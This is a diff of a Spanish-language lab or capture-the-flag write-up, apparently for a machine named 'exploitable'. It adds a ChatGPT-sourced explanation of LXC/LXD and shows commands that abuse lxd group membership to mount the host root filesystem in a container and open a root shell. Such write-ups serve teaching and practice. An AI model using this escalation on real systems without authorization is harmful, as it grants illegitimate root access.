@@ -214,11 +214,21 @@ Despues de enumerar las maquina durante un buen rato, encontramos que el usuario
         plugdev:x:46:john
         lxd:x:108:john
         john:x:1000:
+--
 
-¿Qué es LXD en Ubuntu?
-Linux Container Daemon (LXD), es una herramienta de gestión de los contenedores del sistema operativo Linux. Permite crear contenedores de sistemas Linux ideales para su uso en la nube. Con esta herramienta tenemos la posibilidad de crear múltiples contenedores dentro del mismo.
+INFO Obtenida de CHATGPT sobre LXC/LXD
 
-- Explotamos LXD para llegar a root
+LXD (Linux Container Daemon) y LXC (Linux Containers) son tecnologías relacionadas que se utilizan para crear y administrar contenedores en sistemas Linux. Ambas tecnologías permiten la virtualización a nivel de sistema operativo, lo que significa que varios entornos aislados (contenedores) pueden ejecutarse en una única instancia del sistema operativo anfitrión.
+    
+LXC (Linux Containers): LXC es la tecnología subyacente que proporciona la funcionalidad principal de los contenedores en Linux. Permite la creación y el manejo de contenedores, que son entornos ligeros y aislados que comparten el mismo núcleo del sistema operativo anfitrión. Cada contenedor tiene su propio sistema de archivos, procesos, redes y recursos, pero comparten el mismo kernel subyacente. LXC es una tecnología de nivel más bajo y puede ser utilizada directamente, pero también es comúnmente utilizada a través de herramientas de administración de contenedores más amigables.
+    
+LXD (Linux Container Daemon): LXD es una interfaz más amigable y de alto nivel para administrar contenedores Linux utilizando la tecnología LXC. LXD proporciona una capa de abstracción más fácil de usar y agrega características como la migración en caliente, el manejo de redes avanzado, instantáneas (snapshots) y más. LXD se ejecuta como un daemon y proporciona una API RESTful para interactuar con los contenedores. También se puede administrar a través de una línea de comandos llamada "lxc".
+
+En resumen, LXC es la tecnología subyacente que permite la creación de contenedores Linux, mientras que LXD es una interfaz y un conjunto de herramientas de administración más amigables para trabajar con contenedores basados en LXC. Ambas tecnologías son útiles para la virtualización ligera y el aislamiento de aplicaciones y servicios en entornos Linux.
+
+--
+
+- Explotamos lxd/lxc para llegar a root
 
     Utilizamos el metodo 2.
     INFO: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
@@ -320,7 +330,7 @@ Linux Container Daemon (LXD), es una herramienta de gestión de los contenedores
         john@exploitable:/tmp$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
         Device mydevice added to mycontainer
 
-  -Iniciamos el contenedor
+  - Iniciamos el contenedor
 
           john@exploitable:/tmp$ lxc list
         +-------------+---------+------+------+------------+-----------+
@@ -335,7 +345,7 @@ Linux Container Daemon (LXD), es una herramienta de gestión de los contenedores
         +-------------+---------+-----------------------+-----------------------------------------------+------------+-----------+
         | mycontainer | RUNNING | 10.229.116.117 (eth0) | fd42:2998:1e63:3d6f:216:3eff:fef2:c3c4 (eth0) | PERSISTENT | 0         |
 
-  -Obtener Root
+  - Obtener Root
   
         john@exploitable:/tmp$ lxc exec mycontainer /bin/sh
         ~ # whoami
